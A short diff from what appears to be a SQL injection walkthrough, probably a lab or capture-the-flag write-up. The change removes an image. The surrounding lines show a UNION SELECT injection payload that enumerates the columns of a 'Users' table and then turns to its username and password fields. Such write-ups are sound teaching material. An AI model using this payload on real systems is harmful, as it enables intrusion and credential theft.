@@ -99,7 +99,7 @@ The next step is to get the column names for the "Users" table:
 
     ') UNION SELECT 1,2,COLUMN_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="Users"-- - 
 
-<img width="1002" height="446" alt="usrPriv" src="https://github.com/user-attachments/assets/9ef96a7c-499b-4582-bc7e-fbcf9bf7a6dd" />
+
 
 Lets inspect the "Username" and "Password"
 
